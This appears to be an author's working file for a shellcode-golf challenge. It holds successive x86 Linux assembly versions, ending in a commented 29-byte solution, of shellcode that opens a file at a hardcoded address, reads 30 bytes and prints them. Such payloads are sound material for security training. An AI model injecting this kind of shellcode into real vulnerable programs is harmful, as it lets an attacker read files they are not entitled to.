	
	; Assembly shellcode challenge
	; 29 Byte solution
	; Chirawat (Kim) Yooyuenyong
	
	mov eax, 5
	mov ebx, 0x08049b12
	mov ecx, 0
	mov edx, 0
	int 0x80

	; sys_read from file into memory
	mov ebx, eax
	mov eax, 3
	mov ecx, 0x08049b12
	mov edx, 30
	int 0x80

	; sys_write memory to terminal
	mov eax, 4
	mov ebx, 1
	mov ecx, 0x08049b12
	mov edx, 30
	int 0x80

	; sys_exit
	mov eax, 1
	mov ebx, 0
	int 0x80
	
	=========================
	xor    eax,eax
	add    al,0x5
	mov    ebx,0x8049b12
	cdq
	xor    ecx,ecx
	int    0x80

	mov    ecx ,ebx
	mov    ebx,eax
	xor    eax,eax
	add    al,0x3
	add    dl,0x1e
	int    0x80

	xor    eax, eax
	add    al, 0x4
	xor    ebx,ebx
	add    bl,0x1
	cdq
	add    dl,0x1e
	int    0x80 
	
	
	================
	
	mov    ebx,0x8049b12
	cdq
	xor    ecx,ecx
	lea    eax, [ecx +0x05]
	int    0x80

	mov    ecx ,ebx
	mov    ebx,eax
	lea    eax, [edx+0x03]
	add    dl,0x1e
	int    0x80

	xor    eax, eax
	add    al, 0x4
	lea    ebx, [eax-0x03]
	cdq
	add    dl,0x1e
	int    0x80 
	
	=================
	
    mov    ebx,0x8049b12
    xor    ecx,ecx
    lea    eax, [ecx+0x05]
    cdq
    int    0x80

    mov    ecx ,ebx
    mov    ebx,eax
    lea    eax, [edx+0x03]
    add    dl,0x1e
    int    0x80


	lea    eax, [edx - 0x1A]
    lea    ebx, [eax-0x03]
    cdq
    add    dl,0x1e
    int    0x80
	
	=================================
	
	mov    ebx,0x8049b12
	cdq
	xor    ecx,ecx
	lea    eax, [ecx +0x05]
	int    0x80

	mov    ecx ,ebx
	mov    ebx,eax
	lea    eax, [edx+0x03]
	add    dl,0x1e
	int    0x80

	xor    eax, eax
	add    al, 0x4
	lea    ebx, [eax-0x03]
	cdq
	add    dl,0x1e
	int    0x80
	
	==================================
	
	mov    ebx,0x8049b12
	cdq
	xor    ecx,ecx
	lea    eax, [ecx +0x05]
	int    0x80

	mov    ecx ,ebx
	mov    ebx,eax
	lea    eax, [edx+0x03]
	add    dl,0x1e
	int    0x80

	lea    eax, [edx - 0x1A]
	cdq
	lea    ebx, [edx+0x01]
	add    dl,0x1e
	int    0x80 
	
	=======================
	
	mov    ebx,0x8049b12
    xor    ecx,ecx
    lea    eax, [ecx+0x05]
    cdq
    int    0x80

    mov    ecx ,ebx
    mov    ebx,eax
    lea    eax, [edx+0x03]
    mov    dl,0x1e
    int    0x80


    lea    eax, [edx - 0x1A]
    lea    ebx, [eax-0x03]
    int    0x80 
	
	========================
	
	mov    ebx,0x8049b12
    cdq
	lea    eax, [edx+0x05]
    int    0x80

    xchg   ebx, eax
    mov    ecx, eax
    lea    eax, [edx+0x03]
    mov    dl,0x1e
    int    0x80

    lea    eax, [edx - 0x1A]
    lea    ebx, [eax-0x03]
    int    0x80 
	
	========================
	
	
	mov    ebx,0x8049b12
    xor    ecx, ecx
    lea    eax, [ecx + 0x5]
    cdq
    int    0x80

    xchg   ebx, eax
    mov    ecx, eax
    lea    eax, [edx+0x03]
    mov    dl,0x1e
    int    0x80


    lea    eax, [edx - 0x1A]
    lea    ebx, [eax-0x03]
    int    0x80 
	
	========================
	
	;29 Byte Solution
	
	mov    ebx,0x8049b12		; move 0x8049b12 into ebx
    xor    ecx, ecx				; zero ecx
    lea    eax, [ecx + 0x5]		; mov 5 into eax
    cdq							; zero edx
    int    0x80					; syscall

    xchg   ebx, eax				; exchange ebx and eax
    mov    ecx, eax				; eax into ecx
    lea    eax, [edx+0x03]		; 3 into eax
    mov    dl,0x1e				; 30?(0x1e) into edx(dl)
    int    0x80					; syscall

    mov    eax, 0x04			; 4 into eax
    mov    ebx, 0x01			; 1 into ebx
    int    0x80					; syscall
	